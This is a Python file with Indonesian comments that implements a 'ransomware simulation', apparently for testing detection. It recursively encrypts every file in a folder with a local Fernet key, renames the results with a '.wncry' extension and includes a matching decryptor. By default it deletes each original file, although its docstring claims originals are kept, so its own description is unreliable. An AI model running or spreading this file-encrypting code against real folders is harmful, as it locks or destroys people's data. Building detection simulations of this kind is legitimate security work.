# simulate.py
import os
import time
from typing import List, Optional

from cryptography.fernet import Fernet   # AES-128 + HMAC (Fernet)
try:
    from tqdm import tqdm
except Exception:
    tqdm = None  # fallback: no progress bar

# emit/ stage dari progress.py — pastikan progress.py ada di path project
try:
    from progress import emit
except Exception:
    # fallback no-op agar simulate.py tetap bisa berjalan tanpa progress.py
    def emit(event, **data):  # type: ignore
        pass


# ====================== Helpers ======================
def _safe_tqdm(iterable, use_tqdm: bool, **kwargs):
    """Gunakan tqdm bila tersedia & diminta; jika tidak, kembalikan iterable biasa."""
    if use_tqdm and tqdm is not None:
        return tqdm(iterable, **kwargs)
    return iterable


def _iter_all_files(root_dir: str):
    """Iter semua file (rekursif) di root_dir."""
    for root, _, files in os.walk(root_dir):
        for fn in files:
            yield os.path.join(root, fn)


# ====================== Key Management ======================
def generate_key(key_file: str = "ransom.key") -> Fernet:
    """
    Membuat / memuat kunci enkripsi untuk simulasi ransomware.
    Mengembalikan objek Fernet.
    """
    if not os.path.exists(key_file):
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
    else:
        with open(key_file, "rb") as f:
            key = f.read()
    return Fernet(key)


# ====================== Simulation ======================
def simulate_ransomware_safe(
    source_folder: str,
    extension: str = ".wncry",   # ganti extension sesuai kebutuhan deteksi
    key_file: str = "ransom.key",
    delay: float = 0.05,
    use_tqdm: bool = True,
    *,
    # ===== tambahan agar kompatibel dengan main.py baru =====
    reset: bool = False,
    reset_key: bool = False,
    skip_if_already_encrypted: bool = True,
    include_exts: Optional[list[str]] = None,  # contoh: ["txt","csv","png"]; None = semua file
    delete_plain_after_encrypt: bool = True,
) -> List[str]:
    """
    Simulasi ransomware dengan progress bar dan emit event.
    - File asli tidak dihapus; file terenkripsi dibuat berdampingan dengan ekstensi baru.
    - Jika reset=True: hapus semua file terenkripsi (*.wncry) terlebih dahulu.
    - Jika reset_key=True: hapus key file agar generate kunci baru.
    - skip_if_already_encrypted=True: lewati file yang sudah punya ekstensi target (hindari .wncry.wncry).
    - include_exts=None: enkripsi semua file; jika list diberikan, hanya file dengan ekstensi itu (tanpa titik).
    """
    if not os.path.isdir(source_folder):
        emit("simulate_ransomware_error", error="source_not_found", folder=source_folder)
        raise FileNotFoundError(f"Source folder tidak ditemukan: {source_folder}")

    # 1) Optional: reset hasil enkripsi sebelumnya
    if reset:
        removed = 0
        for path in _iter_all_files(source_folder):
            if path.endswith(extension):
                try:
                    os.remove(path)
                    removed += 1
                except Exception as e:
                    # tidak fatal; lanjutkan
                    emit("simulate_ransomware_reset_remove_error", file=path, error=str(e))
        emit("simulate_ransomware_reset", removed=removed, folder=source_folder)

    # 2) Optional: reset key → generate baru
    if reset_key:
        try:
            if os.path.exists(key_file):
                os.remove(key_file)
            emit("simulate_ransomware_key_reset", key_file=key_file, status="removed")
        except Exception as e:
            emit("simulate_ransomware_key_reset", key_file=key_file, status="error", error=str(e))

    # 3) Siapkan kunci
    try:
        fernet = generate_key(key_file)
    except Exception as e:
        emit("simulate_ransomware_error", error=str(e))
        raise

    # 4) Kumpulkan target file
    all_files = list(_iter_all_files(source_folder))

    # Filter: skip file yang sudah terenkripsi (opsional), dan filter ekstensi tertentu (opsional)
    targets: List[str] = []
    for file_path in all_files:
        if skip_if_already_encrypted and file_path.endswith(extension):
            continue
        if include_exts is not None:
            ext = os.path.splitext(file_path)[1].lstrip(".").lower()
            if ext not in include_exts:
                continue
        targets.append(file_path)

    total = len(targets)
    emit("simulate_ransomware_start", total=total, folder=source_folder, extension=extension)
    print(f"[SIMULATION] Menyerang {total} file di {source_folder}...")

    encrypted_files: List[str] = []
    fails = 0
    iterator = _safe_tqdm(targets, use_tqdm and total > 0, desc="Enkripsi file", unit="file")

    marker = b"SIMULATED_RANSOMWARE\n"

    for idx, file_path in enumerate(iterator, start=1):
        try:
            # baca file
            with open(file_path, "rb") as fh:
                data = fh.read()

            # enkripsi + marker
            encrypted_data = marker + fernet.encrypt(data)

            # tulis file baru tanpa hapus file asli
            new_path = file_path + extension
            os.makedirs(os.path.dirname(new_path), exist_ok=True)
            with open(new_path, "wb") as fh:
                fh.write(encrypted_data)
            
            if delete_plain_after_encrypt:
                try:
                    os.remove(file_path)
                    emit("simulate_ransomware_delete_plain", file=file_path, status="deleted")
                except Exception as e:
                    emit("simulate_ransomware_delete_plain", file=file_path, status="error", error=str(e))

            encrypted_files.append(new_path)
            emit(
                "simulate_ransomware_file",
                idx=idx, total=total,
                file=file_path, dst=new_path, status="ok"
            )
        except Exception as e:
            fails += 1
            emit(
                "simulate_ransomware_file",
                idx=idx, total=total,
                file=file_path, dst=None, status="error", error=str(e)
            )
            print(f"[SIMULATION][ERROR] Gagal enkripsi {file_path}: {e}")

        if delay and delay > 0:
            time.sleep(delay)

    emit(
        "simulate_ransomware_done",
        total_success=len(encrypted_files),
        total_fail=fails,
        folder=source_folder
    )
    print(f"[DONE] {len(encrypted_files)} file berhasil terenkripsi, {fails} gagal.")
    return encrypted_files


def decrypt_ransomware(
    attack_folder: str,
    extension: str = ".wncry",
    key_file: str = "ransom.key",
    output_folder: Optional[str] = None,
    delay: float = 0.0,
    use_tqdm: bool = True
) -> List[str]:
    """
    Mengembalikan semua file terenkripsi di attack_folder (decrypt balik).
    - Mencari file dengan ekstensi target (default: .wncry).
    - Menghapus marker "SIMULATED_RANSOMWARE\\n" sebelum decrypt.
    - Menulis hasil ke output_folder jika diberikan; bila tidak, menulis di folder yang sama.
    """
    if not os.path.exists(key_file):
        emit("decrypt_error", error="key_not_found", key_file=key_file)
        raise FileNotFoundError("Kunci tidak ditemukan. Tidak bisa decrypt.")

    with open(key_file, "rb") as f:
        key = f.read()
    fernet = Fernet(key)

    all_enc_files = []
    for root, _, files in os.walk(attack_folder):
        for fn in files:
            if fn.endswith(extension):
                all_enc_files.append(os.path.join(root, fn))

    total = len(all_enc_files)
    emit("decrypt_start", total=total, folder=attack_folder)
    print(f"[DECRYPT] Mengembalikan {total} file di {attack_folder}...")

    decrypted: List[str] = []
    fails = 0
    iterator = _safe_tqdm(all_enc_files, use_tqdm and total > 0, desc="Decrypt file", unit="file")

    marker = b"SIMULATED_RANSOMWARE\n"

    for idx, enc_path in enumerate(iterator, start=1):
        try:
            with open(enc_path, "rb") as fh:
                enc_data = fh.read()

            # hapus marker sebelum decrypt
            if enc_data.startswith(marker):
                enc_data = enc_data[len(marker):]

            dec_data = fernet.decrypt(enc_data)

            rel_path = os.path.relpath(enc_path, attack_folder)
            # hilangkan ekstensi terenkripsi
            if rel_path.endswith(extension):
                rel_path = rel_path[: -len(extension)]

            # tentukan tujuan
            if output_folder:
                dst_path = os.path.join(output_folder, rel_path)
            else:
                dst_path = os.path.join(os.path.dirname(enc_path), rel_path)

            os.makedirs(os.path.dirname(dst_path), exist_ok=True)
            with open(dst_path, "wb") as fh:
                fh.write(dec_data)

            decrypted.append(dst_path)
            emit("decrypt_file", idx=idx, total=total, encrypted=enc_path, restored=dst_path, status="ok")
        except Exception as e:
            fails += 1
            emit("decrypt_file", idx=idx, total=total, encrypted=enc_path, restored=None, status="error", error=str(e))
            print(f"[DECRYPT][ERROR] Gagal decrypt {enc_path}: {e}")

        if delay and delay > 0:
            time.sleep(delay)

    emit("decrypt_done", total_success=len(decrypted), total_fail=fails, folder=attack_folder)
    print(f"[DECRYPT DONE] {len(decrypted)} file dikembalikan, {fails} gagal.")
    return decrypted
